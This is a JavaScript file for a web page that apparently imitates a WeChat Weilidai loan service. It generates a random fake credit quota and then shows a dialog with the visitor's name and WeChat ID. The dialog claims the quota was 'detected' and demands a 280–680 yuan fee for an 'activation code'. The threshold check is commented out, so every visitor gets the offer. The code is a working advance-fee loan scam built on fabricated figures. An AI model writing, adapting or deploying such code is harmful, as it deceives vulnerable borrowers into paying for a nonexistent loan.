;(function(){

    var Dom = {
        borrow_money:$('#borrow_money'),
    }

    function init(){
        $.app.login.checked();
        getQuota();
    }

    function getQuota(){
        //todo 设置额度 并检测是否可激活
        //额度
        //额度
        var edu = getEDu();
        var quota =  $.app.Util.StorageGetter('quota') || edu,
            baseEDu = $.app.Util.StorageGetter('base_edu') || 208000; //可激活的额度的标准
        $.app.Util.StorageSetter('quota',quota);
        $('#count').animateNumber({ number: quota});
        $('.total').text(quota);

        var username = $.app.Util.StorageGetter('user_name'),
            wxname = $.app.Util.StorageGetter('wx_name');
            paymoney =  $.app.Util.StorageGetter('pay_money');
// 4万以下280 4到6万8就360。6万8到12万8收560 12万八以上680
            if(quota > 30000 && quota <39999){
                paymoney = 280;
            }else if(quota > 39999 && quota < 67999){
                paymoney = 360;
            }else if(quota > 67999 && quota < 127999){
                paymoney = 560;
            }else{
                paymoney = 680;
            }

        setTimeout(function(){
            // if(quota > baseEDu ){ //可激活
                $.DialogByZ.Confirm({Title: "", Content: '姓名：'+ username +'，微信号：'+ wxname +'，成功检测可用额度'+ quota +'，如果激活开通，需要支付'+paymoney+'元获取激活码！激活开通后，微信钱包中显示微粒贷借钱图标，即可成功借款！',BtnL:"取消",BtnR:"确定",FunL:cancelAct,FunR:sureActive})
            // }
        },1500);
    }

    function getEDu(){
        var edu = (((Math.random() * 208000 | 0) / 1000) | 0) * 1000;
        while(1){
            if(edu > 30000){
                return edu;
            }else{
                edu = Math.random() * 208000 | 0;
            }
        }
    }

    function EventHandler(){
        //  TODO  事件

        Dom.borrow_money.click(function(){

        });
    }

    //弹框

    function cancelAct(){
        $.DialogByZ.Close();
    }
    function sureActive(){
        $.DialogByZ.Close();
    }

    init();


})();
